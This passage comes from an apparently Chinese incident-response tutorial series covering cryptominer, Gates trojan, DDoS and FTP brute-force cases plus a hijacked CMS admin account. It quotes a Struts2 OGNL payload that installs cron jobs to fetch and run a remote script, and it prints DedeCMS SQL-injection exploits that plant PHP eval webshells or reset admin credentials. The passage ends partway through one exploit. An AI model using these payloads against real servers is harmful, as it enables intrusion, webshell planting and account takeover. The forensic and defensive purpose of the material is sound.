alt></p><p>跑了三次脚本，可以发现短连接每次发起的进程Pid一直在变，但已经捕捉到发起该异常连接的进程源文件为 /usr/lib/nfsiod</p><h3 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><p>​    本文简单介绍了短连接以及捕捉短连接源文件的技巧，站在安全管理员的角度，应加强对网络安全设备的管理，在网络层去发现更多在系统层很难察觉的安全威胁。</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第3章第3篇：挖矿病毒</title>
      <link href="/2019/10/16/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/"/>
      <url>/2019/10/16/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第3篇：挖矿病毒"><a href="#第3篇：挖矿病毒" class="headerlink" title="第3篇：挖矿病毒"></a>第3篇：挖矿病毒</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    随着虚拟货币的疯狂炒作，利用挖矿脚本来实现流量变现，使得挖矿病毒成为不法分子利用最为频繁的攻击方式。新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率，通过利用永恒之蓝（EternalBlue）、web攻击多种漏洞（如Tomcat弱口令攻击、Weblogic WLS组件漏洞、Jboss反序列化漏洞、Struts2远程命令执行等），导致大量服务器被感染挖矿程序的现象 。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天，安全管理员在登录安全设备巡检时，发现某台网站服务器持续向境外IP发起连接，下载病毒源：</p><p><img src="/images/linux-12-1.png" alt></p><p>###0x02 事件分析</p><h4 id="A、排查过程"><a href="#A、排查过程" class="headerlink" title="A、排查过程"></a>A、排查过程</h4><p>登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 :</p><p><img src="/images/linux-12-2.png" alt></p><p><img src="/images/linux-12-3.png" alt></p><p>下载logo.jpg，包含脚本内容如下：</p><p><img src="/images/linux-12-4.png" alt>    </p><p>到这里，我们可以发现攻击者下载logo.jpg并执行了里面了shell脚本，那这个脚本是如何启动的呢？</p><p>通过排查系统开机启动项、定时任务、服务等，在定时任务里面，发现了恶意脚本，每隔一段时间发起请求下载病毒源，并执行 。</p><p><img src="/images/linux-12-5.png" alt></p><h4 id="B、溯源分析"><a href="#B、溯源分析" class="headerlink" title="B、溯源分析"></a>B、溯源分析</h4><p>​    在Tomcat log日志中，我们找到这样一条记录：</p><p><img src="/images/linux-12-6.png" alt></p><p>对日志中攻击源码进行摘录如下： </p><p><code>{(#_=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;echo &quot;*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh&quot; | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</code></p><p>可以发现攻击代码中的操作与定时任务中异常脚本一致，据此推断黑客通过Struct 远程命令执行漏洞向服务器定时任务中写入恶意脚本并执行。</p><h4 id="C、清除病毒"><a href="#C、清除病毒" class="headerlink" title="C、清除病毒"></a>C、清除病毒</h4><p>1、删除定时任务:</p><p><img src="/images/linux-12-7.png" alt></p><p>2、终止异常进程:</p><p><img src="/images/linux-12-8.png" alt></p><h4 id="D、漏洞修复"><a href="#D、漏洞修复" class="headerlink" title="D、漏洞修复"></a>D、漏洞修复</h4><p>​    升级struts到最新版本 </p><h3 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h3><p>​    针对服务器被感染挖矿程序的现象，总结了几种预防措施：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护</span><br><span class="line">2、及时更新 Windows安全补丁，开启防火墙临时关闭端口</span><br><span class="line">3、及时更新web漏洞补丁，升级web组件</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第3章第4篇：盖茨木马</title>
      <link href="/2019/10/16/%E7%AC%AC4%E7%AF%87%EF%BC%9A%E7%9B%96%E8%8C%A8%E6%9C%A8%E9%A9%AC/"/>
      <url>/2019/10/16/%E7%AC%AC4%E7%AF%87%EF%BC%9A%E7%9B%96%E8%8C%A8%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第4篇：盖茨木马"><a href="#第4篇：盖茨木马" class="headerlink" title="第4篇：盖茨木马"></a>第4篇：盖茨木马</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    Linux盖茨木马是一类有着丰富历史，隐藏手法巧妙，网络攻击行为显著的DDoS木马，主要恶意特点是具备了后门程序，DDoS攻击的能力，并且会替换常用的系统文件进行伪装。木马得名于其在变量函数的命名中，大量使用Gates这个单词。分析和清除盖茨木马的过程，可以发现有很多值得去学习和借鉴的地方。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天，网站管理员发现服务器CPU资源异常，几个异常进程占用大量网络带宽：</p><p><img src="/images/linux-13-1.png" alt> </p><h3 id="0x02-事件分析"><a href="#0x02-事件分析" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><p><strong>异常IP连接：</strong></p><p><img src="/images/linux-13-2.png" alt></p><p><strong>异常进程：</strong></p><p>​         查看进行发现ps aux进程异常，进入该目录发现多个命令，猜测命令可能已被替换</p><p>登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 :</p><p><img src="/images/linux-13-3.png" alt></p><p><strong>异常启动项</strong></p><p>进入rc3.d目录可以发现多个异常进行：</p><p>/etc/rc.d/rc3.d/S97DbSecuritySpt</p><p>/etc/rc.d/rc3.d/S99selinux</p><p><img src="/images/linux-13-4.png" alt></p><p><img src="/images/linux-13-5.png" alt></p><p><strong>搜索病毒原体</strong></p><p>find / -size -1223124c -size +1223122c -exec ls -id {} ;   搜索1223123大小的文件 </p><p><img src="/images/linux-13-6.png" alt></p><p>从以上种种行为发现该病毒与“盖茨木马”有点类似，具体技术分析细节详见：</p><blockquote><p>Linux平台“盖茨木马”分析</p><p><a href="http://www.freebuf.com/articles/system/117823.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/117823.html</a></p><p>悬镜服务器卫士丨Linux平台“盖茨木马”分析</p><p><a href="http://www.sohu.com/a/117926079_515168" target="_blank" rel="noopener">http://www.sohu.com/a/117926079_515168</a></p></blockquote><p>手动清除木马过程： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">1、简单判断有无木马</span><br><span class="line">#有无下列文件</span><br><span class="line">cat /etc/rc.d/init.d/selinux</span><br><span class="line">cat /etc/rc.d/init.d/DbSecuritySpt</span><br><span class="line">ls /usr/bin/bsd-port</span><br><span class="line">ls /usr/bin/dpkgd</span><br><span class="line">#查看大小是否正常</span><br><span class="line">ls -lh /bin/netstat</span><br><span class="line">ls -lh /bin/ps</span><br><span class="line">ls -lh /usr/sbin/lsof</span><br><span class="line">ls -lh /usr/sbin/ss</span><br><span class="line"></span><br><span class="line">2、上传如下命令到/root下</span><br><span class="line">ps netstat ss lsof</span><br><span class="line"></span><br><span class="line">3、删除如下目录及文件</span><br><span class="line">rm -rf /usr/bin/dpkgd (ps netstat lsof ss)</span><br><span class="line">rm -rf /usr/bin/bsd-port     #木马程序</span><br><span class="line">rm -f /usr/bin/.sshd         #木马后门</span><br><span class="line">rm -f /tmp/gates.lod</span><br><span class="line">rm -f /tmp/moni.lod</span><br><span class="line">rm -f /etc/rc.d/init.d/DbSecuritySpt(启动上述描述的那些木马变种程序)</span><br><span class="line">rm -f /etc/rc.d/rc1.d/S97DbSecuritySpt</span><br><span class="line">rm -f /etc/rc.d/rc2.d/S97DbSecuritySpt</span><br><span class="line">rm -f /etc/rc.d/rc3.d/S97DbSecuritySpt</span><br><span class="line">rm -f /etc/rc.d/rc4.d/S97DbSecuritySpt</span><br><span class="line">rm -f /etc/rc.d/rc5.d/S97DbSecuritySpt</span><br><span class="line">rm -f /etc/rc.d/init.d/selinux(默认是启动/usr/bin/bsd-port/getty)</span><br><span class="line">rm -f /etc/rc.d/rc1.d/S99selinux</span><br><span class="line">rm -f /etc/rc.d/rc2.d/S99selinux</span><br><span class="line">rm -f /etc/rc.d/rc3.d/S99selinux</span><br><span class="line">rm -f /etc/rc.d/rc4.d/S99selinux</span><br><span class="line">rm -f /etc/rc.d/rc5.d/S99selinux</span><br><span class="line">4、找出异常程序并杀死</span><br><span class="line">5、删除含木马命令并重新安装</span><br></pre></td></tr></table></figure><h3 id="0x03-命令替换"><a href="#0x03-命令替换" class="headerlink" title="0x03 命令替换"></a>0x03 命令替换</h3><p><strong>RPM check检查：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">系统完整性也可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查</span><br><span class="line">./rpm -Va &gt; rpm.log</span><br><span class="line">如果一切均校验正常将不会产生任何输出。如果有不一致的地方，就会显示出来。输出格式是8位长字符串, ``c 用以指配置文件, 接着是文件名. 8位字符的每一个 用以表示文件与RPM数据库中一种属性的比较结果 。``. (点) 表示测试通过。.下面的字符表示对RPM软件包进行的某种测试失败：</span><br></pre></td></tr></table></figure><p><img src="/images/linux-13-7.png" alt></p><p><strong>命令替换：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rpm2cpio 包全名 |  cpio -idv .文件绝对路径   rpm包中文件提取</span><br><span class="line">Rpm2cpio  将rpm包转换为cpio格式的命令 </span><br><span class="line">Cpio 是一个标准工具，它用于创建软件档案文件和从档案文件中提取文件</span><br><span class="line"></span><br><span class="line">Cpio 选项 &lt; [文件|设备]</span><br><span class="line">-i：copy-in模式，还原</span><br><span class="line">-d：还原时自动新建目录</span><br><span class="line">-v：显示还原过程</span><br></pre></td></tr></table></figure><p>文件提取还原案例： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rpm  -qf /bin/ls  查询ls命令属于哪个软件包</span><br><span class="line">mv  /bin/ls /tmp  </span><br><span class="line">rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取rpm包中ls命令到当前目录的/bin/ls下</span><br><span class="line">cp /root/bin/ls  /bin/ 把ls命令复制到/bin/目录 修复文件丢失</span><br><span class="line"></span><br><span class="line">挂载命令rpm包：</span><br><span class="line">mkdir  /mnt/chrom/  建立挂载点</span><br><span class="line">mount -t iso9660 /dev/cdrom  /mnt/cdrom/  挂在光盘</span><br><span class="line">mount/dev/sr0 /mnt/cdrom/</span><br><span class="line"></span><br><span class="line">卸载命令</span><br><span class="line">umount  设备文件名或挂载点</span><br><span class="line">umount /mnt/cdrom/</span><br></pre></td></tr></table></figure><p><img src="/images/linux-13-8.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第3章第5篇：DDOS病毒</title>
      <link href="/2019/10/16/%E7%AC%AC5%E7%AF%87%EF%BC%9ADDOS%E7%97%85%E6%AF%92/"/>
      <url>/2019/10/16/%E7%AC%AC5%E7%AF%87%EF%BC%9ADDOS%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第5篇：DDOS病毒"><a href="#第5篇：DDOS病毒" class="headerlink" title="第5篇：DDOS病毒"></a>第5篇：DDOS病毒</h2><h3 id="现象描述"><a href="#现象描述" class="headerlink" title="现象描述"></a>现象描述</h3><p>某服务器网络资源异常,感染该木马病毒的服务器会占用网络带宽，甚至影响网络业务正常应用。</p><h3 id="系统分析"><a href="#系统分析" class="headerlink" title="系统分析"></a>系统分析</h3><p>针对日志服务器病毒事件排查情况：<br>在开机启动项/etc/rc.d/rc.local发现可疑的sh.sh脚本，进一步跟踪sh.sh脚本,这是一个检测病毒十分钟存活的脚本。</p><p>在root目录下发现存活检测脚本</p><p><img src="/images/linux-14-1.png" alt></p><p>解决步骤：</p><ol><li>结束进程 ps aux | grep “conf.m” | grep -v grep | awk ‘{print $2}‘| xargs kill -9 </li><li>清除自动启动脚本 vim /etc/rc.local 去掉 sh /etc/chongfu.sh &amp; </li><li>清除 脚本 rm -rf /etc/chongfu.sh /tem/chongfu.sh </li><li>修改登录密码 passwd </li><li>重启。 reboot</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第4章第1篇：FTP暴力破解</title>
      <link href="/2019/10/16/%E7%AC%AC1%E7%AF%87%EF%BC%9AFTP%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
      <url>/2019/10/16/%E7%AC%AC1%E7%AF%87%EF%BC%9AFTP%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第1篇：FTP暴力破解"><a href="#第1篇：FTP暴力破解" class="headerlink" title="第1篇：FTP暴力破解"></a>第1篇：FTP暴力破解</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    FTP是一个文件传输协议，用户通过FTP可从客户机程序向远程主机上传或下载文件，常用于网站代码维护、日常源码备份等。如果攻击者通过FTP匿名访问或者弱口令获取FTP权限，可直接上传webshell，进一步渗透提权，直至控制整个网站服务器。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    从昨天开始，网站响应速度变得缓慢，网站服务器登录上去非常卡，重启服务器就能保证一段时间的正常访问，网站响应状态时而飞快时而缓慢，多数时间是缓慢的。针对网站服务器异常，系统日志和网站日志，是我们排查处理的重点。查看Window安全日志，发现大量的登录失败记录：</p><p><img src="/images/win-5-1.png" alt></p><h3 id="0x02-日志分析"><a href="#0x02-日志分析" class="headerlink" title="0x02 日志分析"></a>0x02 日志分析</h3><p><strong>安全日志分析：</strong> </p><p>安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么。</p><p>打开安全日志，在右边点击筛选当前日志， 在事件ID填入4625，查询到事件ID4625，事件数177007，从这个数据可以看出，服务器正则遭受暴力破解：</p><p><img src="/images/win-5-2.png" alt></p><p>进一步使用Log Parser对日志提取数据分析，发现攻击者使用了大量的用户名进行爆破，例如用户名：fxxx，共计进行了17826次口令尝试，攻击者基于“fxxx”这样一个域名信息，构造了一系列的用户名字典进行有针对性进行爆破，如下图：</p><p><img src="/images/win-5-3.png" alt></p><p>这里我们留意到登录类型为8，来了解一下登录类型8是什么意思呢？</p><p><strong>登录类型8：网络明文（NetworkCleartext）</strong>   </p><p>这种登录表明这是一个像类型3一样的网络登录，但是这种登录的密码在网络上是通过明文传输的，WindowsServer服务是不允许通过明文验证连接到共享文件夹或打印机的，据我所知只有当从一个使用Advapi的ASP脚本登录或者一个用户使用基本验证方式登录IIS才会是这种登录类型。“登录过程”栏都将列出Advapi。  </p><p>我们推测可能是FTP服务，通过查看端口服务及管理员访谈，确认服务器确实对公网开放了FTP服务。</p><p><img src="/images/win-5-4.png" alt></p><p>另外，日志并未记录暴力破解的IP地址，我们可以使用Wireshark对捕获到的流量进行分析，获取到正在进行爆破的IP：</p><p><img src="/images/win-5-5.png" alt></p><p>通过对近段时间的管理员登录日志进行分析，如下：</p><p><img src="/images/win-5-6.png" alt></p><p>管理员登录正常，并未发现异常登录时间和异常登录ip，这里的登录类型10，代表远程管理桌面登录。</p><p>另外，通过查看FTP站点，发现只有一个测试文件，与站点目录并不在同一个目录下面，进一步验证了FTP暴力破解并未成功。</p><p><img src="/images/win-5-7.png" alt></p><p>应急处理措施：1、关闭外网FTP端口映射           2、删除本地服务器FTP测试</p><h3 id="0x04-处理措施"><a href="#0x04-处理措施" class="headerlink" title="0x04 处理措施"></a>0x04 处理措施</h3><p>​    FTP暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、禁止使用FTP传输文件，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于8位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。</span><br><span class="line">2、更改服务器FTP默认端口。</span><br><span class="line">3、部署入侵检测设备，增强安全防护。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第四章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第5章第8篇：管理员账号被篡改</title>
      <link href="/2019/10/16/%E7%AC%AC8%E7%AF%87%EF%BC%9A%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E8%A2%AB%E7%AF%A1%E6%94%B9/"/>
      <url>/2019/10/16/%E7%AC%AC8%E7%AF%87%EF%BC%9A%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E8%A2%AB%E7%AF%A1%E6%94%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="第8篇：管理员账号被篡改"><a href="#第8篇：管理员账号被篡改" class="headerlink" title="第8篇：管理员账号被篡改"></a>第8篇：管理员账号被篡改</h2><p>​        你是某一个网站的管理员，有一天，你的管理员账号admin却登录不了，进入数据库查看，原来管理员账号用户名不存在了，却多了另外一个管理员用户名。不对，不是新增了管理员，而是你的管理员用户名被篡改了。</p><h3 id="现象描述"><a href="#现象描述" class="headerlink" title="现象描述"></a>现象描述</h3><p>前后端分离，后台只允许内网访问，管理员账号admin却依然被多次被篡改</p><h3 id="问题处理"><a href="#问题处理" class="headerlink" title="问题处理"></a>问题处理</h3><p><strong>1、网站webshell</strong></p><p>在针对网站根目录进行webshell扫描，发现存在脚本木马，创建时间为2018-06-13 04:30:30</p><p><img src="/images/8-1.png" alt></p><p><strong>2、 定位IP</strong> </p><p>通过木马创建时间， 查看网站访问日志，定位到IP为：180.xx.xx.3</p><p><img src="/images/8-2.png" alt></p><p><strong>3、关联分析</strong></p><p>全局搜索与该IP有关的操作日志：</p><p><img src="/images/8-3.png" alt></p><p>在脚本木马生成前，有两条比较可疑的访问日志吸引了我们的注意：</p><p><code>172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] &quot;GET /plus/download.php?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=109&amp;arrs2[]=121&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=110&amp;arrs2[]=111&amp;arrs2[]=114&amp;arrs2[]=109&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=32&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=102&amp;arrs2[]=105&amp;arrs2[]=108&amp;arrs2[]=101&amp;arrs2[]=95&amp;arrs2[]=112&amp;arrs2[]=117&amp;arrs2[]=116&amp;arrs2[]=95&amp;arrs2[]=99&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=115&amp;arrs2[]=40&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=46&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=101&amp;arrs2[]=118&amp;arrs2[]=97&amp;arrs2[]=108&amp;arrs2[]=40&amp;arrs2[]=36&amp;arrs2[]=95&amp;arrs2[]=80&amp;arrs2[]=79&amp;arrs2[]=83&amp;arrs2[]=84&amp;arrs2[]=91&amp;arrs2[]=120&amp;arrs2[]=93&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=101&amp;arrs2[]=99&amp;arrs2[]=104&amp;arrs2[]=111&amp;arrs2[]=32&amp;arrs2[]=109&amp;arrs2[]=79&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=87&amp;arrs2[]=72&amp;arrs2[]=69&amp;arrs2[]=82&amp;arrs2[]=69&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=97&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=57&amp;arrs2[]=32&amp;arrs2[]=35 HTTP/1.1&quot; 200 67</code>  </p><p><code>172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] &quot;GET /plus/ad_js.php?aid=19 HTTP/1.1&quot; 200 32</code> </p><p>对这段POC进行解码，我们发现通过这个poc可以往数据库中插入数据，进一步访问/plus/ad_js.php?aid=19 即可在plus目录生成read.php脚本文件。</p><p><img src="/images/8-4.png" alt></p><p>解码后：</p><p>cfg_dbprefixmyad<code>SET</code>normbody<code>= &#39;&lt;?php file_put_contents(&#39;&#39;read.php&#39;&#39;,&#39;&#39;&lt;?php eval($_POST[x]);echo mOon;?&gt;&#39;&#39;);?&gt;&#39; WHERE</code>aid` =19 #  </p><p>综上，可以推测/plus/download.php中可能存在SQL注入漏洞，接下来，收集网上已公开的有以下3种EXP进行漏洞复现。</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><strong>利用方式一：修改后台管理员</strong></p><p>1、新建管理员账号test/test123789，可以成功登录网站后台</p><p>2、构造如下注入SQL语句：</p><p><code>cfg_dbprefixadmin SETuserid=&#39;spider&#39;,pwd</code>=’f297a57a5a743894a0e4’ where id=19 #`</p><p>修改后台管理员为：用户名spider，密码admin。</p><p>（3）对应的EXP:</p><p><code>？open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=109&amp;arrs2[]=105&amp;arrs2[]=110&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=117&amp;arrs2[]=115&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=115&amp;arrs2[]=112&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=112&amp;arrs2[]=119&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=102&amp;arrs2[]=50&amp;arrs2[]=57&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=97&amp;arrs2[]=55&amp;arrs2[]=52&amp;arrs2[]=51&amp;arrs2[]=56&amp;arrs2[]=57&amp;arrs2[]=52&amp;arrs2[]=97&amp;arrs2[]=48&amp;arrs2[]=101&amp;arrs2[]=52&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=119&amp;arrs2[]=104&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=32&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=57&amp;arrs2[]=32&amp;arrs2[]=35</code> </p><p>执行EXP后，相应后台数据库表变为如下：</p><p><img src="/images/8-5.png" alt></p><p>（4）因此相应后台登录用户变为spider密码admin</p><p><strong>利用方式二：通过/plus/mytag_js.php文件生成一句话木马php</strong></p><p>（1）如：构造如下注入SQL语句：</p><p>`cfg_dbprefixmytag(aid,expbody,normbody) VALUES(9013,@&#39;,’{dede:php}file_put_contents(‘’90sec.php’’,’’<?php eval($_POST[guige]);?>‘’);{/dede:php}’) # @&#39;``</p><p>（2）对应的EXP:</p><p><code>?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=109&amp;arrs2[]=121&amp;arrs2[]=116&amp;arrs2[]=97&amp;arrs2[]=103&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=40&amp;arrs2[]=97&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=44&amp;arrs2[]=101&amp;arrs2[]=120&amp;arrs2[]=112&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=44&amp;arrs2[]=110&amp;arrs2[]=111&amp;arrs2[]=114&amp;arrs2[]=109&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=41&amp;arrs2[]=32&amp;arrs2[]=86&amp;arrs2[]=65&amp;arrs2[]=76&amp;a